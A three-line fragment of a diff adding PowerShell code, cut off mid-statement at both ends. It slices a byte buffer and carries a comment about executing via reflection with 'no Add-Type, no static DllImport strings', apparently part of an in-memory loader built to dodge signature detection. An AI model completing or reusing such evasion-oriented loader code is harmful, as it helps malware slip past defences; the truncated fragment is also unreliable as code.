@@ -1,0 +1,3 @@
+r,16,$xr.Length-16)
+# Execute via reflection — no Add-Type, no static DllImport strings
+$rt=[Type]$py[0];[
